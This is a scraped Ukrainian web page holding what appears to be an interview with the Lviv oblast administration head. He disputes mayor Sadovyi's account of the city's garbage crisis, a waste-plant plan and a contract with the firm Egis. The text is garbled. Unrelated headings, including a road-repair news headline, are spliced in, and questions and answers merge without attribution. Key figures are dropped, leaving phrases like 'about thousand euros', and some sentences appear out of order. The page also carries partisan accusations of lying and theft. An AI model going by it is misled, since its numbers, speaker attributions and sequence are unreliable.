<p>
<p>Здається, востаннє ми були разом на заході на Личаківському цвинтарі. Але ми з ним говорили не про публічні дискусії. Я сказав, що не хотів би разом дискутувати десь на телебаченні або в якійсь іншій програмі. Бо це неправильно. Наскільки я знаю, то його думка є такою ж. Так, Андрія Садового обурило, що ви самі написали проект ухвали для міськради з приводу передачі обласній адміністрації функцій вивозу та утилізації сміття.</p><strong><a id='w1'></a><h2>Інтерв'ю | ЛОДА/LODA – Львівська обласна державна адміністрація</h2></strong><p>А на представлення цієї ухвали покликали до себе в кабінет керівників всіх фракцій у міськраді, крім "Самопомочі". Під облдержадміністрацією стоять намети "Самопомочі" з вимогою зняти "сміттєву блокаду", — УП. А на нараду з керівниками фракцій чому їх не покликали? Але вважаю, що авторитарно можна керувати тільки тоді, коли приймаєш рішення і дуже чітко і послідовно його виконуєш.</p>
		
	<p>А до моменту прийняття рішення треба радитися, вислуховувати різні думки, заперечення. Інакше ти не зможеш прийняти виваженого рішення. Коли я запросив керівників фракцій, я запропонував їм своє бачення, як вирішити проблему. Мені здається, що це абсолютно нормально. Адже у вас теж є намір будувати заводи на Львівщині, але за рахунок інвесторів.</p><strong><a id='w2'></a><h2>Яворівський район</h2></strong><p>А без гарантованих обсягів сміття навряд чи інвестор візьметься за проект. Тому наша пропозиція в проекті ухвали дала б можливість підтвердити інвестору конкретний обсяг для будівництва. Для мене не принципово, в якому місті буде збудований завод — чи це область, чи Львів. Проте я не розумію, звідки у вас інформація стосовно будівництва сміттєпереробного заводу у Львові? Наскільки я знаю, на сьогодні немає ані проектної документації, ані тим паче прив'язки цієї проектної документації до земельної ділянки, ані підтвердженого фінансового ресурсу.</p>
<p>І дуже багато цієї брехні лунає з вуст очільників міської влади. Це брехня про блокаду, про меморандум, який нібито не працює, про ультиматуми. Так само це брехня про кредит  погодження якого, за версією Садового, затримують в Кабміні, — УП. Хто хоч один раз працював з європейськими фінансовими установами, той розуміє, що така процедура насправді розтягується на декілька років.</p>
<p>І міський голова прекрасно розуміє, що нереально отримати ці кошти в му році. Тому це все неправда, якою стараються прикрити безгосподарність та безпомічність. Синютка: "Садовий неправдою старається прикрити безгосподарність та безпомічність" — Водночас, міська рада вже замовила харківській фірмі проектну документацію для заводу. Тобто щось-таки, та й робиться. І я не бачив. І ніяка харківська фірма зараз нічого не розробляє?</p><a id='w3'></a><h3>Графік роботи:</h3><p>Я не бачив ні харківської фірми, ні угод. Маю на увазі французьку фірму Egis, яка уже півроку працює у Львові над програмою поводження ТПВ у Львові, і в травні запропонувала будувати завод на території на ТЕЦ І з приводу цього я публічно і офіційно заявляв, що якщо хтось хоче списати близько тисяч євро  вартість робіт Egis, — УП  на визначення морфології твердих побутових відходів, визначення земельної ділянки, визначення технології побудови заводу і перекладу з української на англійську чи французьку мову проекту рекультивації Грибовицького сміттєзвалища — то я подам офіційну заяву в правоохоронні органи, що це є розкрадання.</p>
<p>Тому що я сто відсотків знаю, що це не коштує тисяч євро. Так само я можу вам написати перелік технологій переробки ТПВ, яких в світі є аж чотири.</p><strong><a id='w4'></a><h2>“За додаткові 589 мільйонів гривень відремонтуємо ще понад 10 важливих доріг”, – Юрій Бучко</h2></strong><p>То на скільки сотень тисяч євро я вже претендую?.. Це гроші, які отримує Україна. Я не хочу, щоб хтось вважав українців злодіями. Виякось натякали, що Львів продукує значно менше, ніж тон сміття, про які заявляє міська рада і на вивіз яких виділяються кошти. І це суттєво відрізняється від  Цифра в тонн ніким не підтверджена. На нараді з перевізниками я озвучив одне з перших завдань — це стовідсотковий облік вивозу твердих побутових відходів. Тому що без обліку говорити про витрачання коштів чи взагалі про якісь цифри неправильно.</p>
		
